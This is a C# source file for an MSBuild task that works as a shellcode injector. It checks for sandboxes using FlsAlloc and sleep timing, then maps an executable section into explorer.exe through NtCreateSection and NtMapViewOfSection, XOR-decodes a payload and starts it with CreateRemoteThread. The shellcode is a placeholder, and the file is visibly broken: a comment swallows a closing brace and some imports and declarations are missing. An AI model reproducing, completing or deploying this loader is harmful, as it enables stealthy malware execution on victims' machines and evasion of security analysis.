using System;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Runtime.InteropServices;
using System.Text;

namespace MyTasks
{
    public class SimpleTask : Task
    {

        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 SECTION_QUERY = 0x0001;
        public const UInt32 SECTION_MAP_WRITE = 0x0002;
        public const UInt32 SECTION_MAP_READ = 0x0004;
        public const UInt32 SECTION_MAP_EXECUTE = 0x0008;
        public const UInt32 SECTION_EXTEND_SIZE = 0x0010;
        public const UInt32 SECTION_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref UInt32 MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            UIntPtr ZeroBits,
            UIntPtr CommitSize,
            out ulong SectionOffset,
            out uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect
        );



        [DllImport("kernel32.dll")]
        static extern IntPtr FlsAlloc(IntPtr lpCallback);

        public override bool Execute()
        {
            IntPtr x = FlsAlloc(IntPtr.Zero);
            if ((uint)x == 0xFFFFFFFF) { return true; };
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5) { return true; }
            // get process by name
            Process[] localByName = Process.GetProcessesByName("explorer");
            int Id = localByName[0].Id;
            // inject with dynamic id
            byte[] buf = new byte[610] {// put shell code here };

            // set to 0 then will be the point of the memory section
            IntPtr handleSection = IntPtr.Zero;

            // handle of explorer id
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, Id);
            uint maxSize = (uint)buf.Length;
            // https://learn.microsoft.com/en-us/windows/win32/sync/synchronization-object-security-and-access-rights

            uint PAGE_EXECUTE_READWRITE = 0x40;
            uint SEC_COMMIT = 0x8000000;
            NtCreateSection(ref handleSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            Console.WriteLine($" handle section {handleSection}");
            Console.WriteLine($" handle explorer {hProcess}");

            IntPtr address_memory_own_process = IntPtr.Zero;
            IntPtr address_memory_explorer = IntPtr.Zero;
            uint viewsize = 0;
            ulong sectionOffset = 0;
            uint allocation = 0;

            uint status;

            // map section into our own process
            status = NtMapViewOfSection(
                   handleSection,
                   GetCurrentProcess(),
                   ref address_memory_own_process,
                   UIntPtr.Zero,
                   UIntPtr.Zero,
                   out sectionOffset,
                   out viewsize,
                   2,
                   allocation,
                   PAGE_EXECUTE_READWRITE
               );

            Console.WriteLine($" address memory of map in current process  0x{address_memory_own_process}");

            // map it to explorer process
            status = NtMapViewOfSection(
                   handleSection,
                   hProcess,
                   ref address_memory_explorer,
                   UIntPtr.Zero,
                   UIntPtr.Zero,
                   out sectionOffset,
                   out viewsize,
                   2,
                   allocation,
                   PAGE_EXECUTE_READWRITE
               );

            Console.WriteLine($" address memory of map in remote process  0x{address_memory_explorer} id {Id}");

            for (int i = 0; i < buf.Length; i++) { buf[i] = (byte)(buf[i] ^ 0x2a); }
            // copy bytes array into unmanaged memory in our map view
            Marshal.Copy(buf, 0, address_memory_own_process, buf.Length);


            // IntPtr outSize
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, address_memory_explorer, IntPtr.Zero, 0, IntPtr.Zero);
            return true;
        }
    }
}
